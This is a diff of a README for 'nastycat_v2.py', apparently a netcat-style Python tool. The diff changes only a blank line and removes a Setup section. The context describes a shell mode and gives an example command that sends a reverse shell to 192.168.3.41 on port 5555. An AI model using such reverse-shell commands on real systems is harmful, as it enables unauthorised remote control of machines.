@@ -21,6 +21,7 @@ Also includes an upload mode.
 Now a shell mode is included.
 - When enabled with listening mode, activates a server, when a client connects, provides the client access to the server machine's terminal. When client disconnects, repeats the same until it is manually killed.
 - When enabled in client mode, invokes an actual reverse shell payload to be sent to the server which allows the server to access the client's terminal.
+
 Note - This is now only supported in linux or linux based operating systems. It does not works as it is supposed to in windows systems.
 
 ## Examples
@@ -55,10 +56,6 @@ python3 ./nastycat_v2.py -s 192.168.3.41 -p 5555 # sends an actual reverse shell
 ```bash
 python3 ./nastycat_v2.py -ls # starts a server, when a client connects, gets access to the servers terminal.
 ```
-
-## Setup
-
-Run the setup file and it will automatically setup everything.
 
 Note - This may require root priviledges.
 
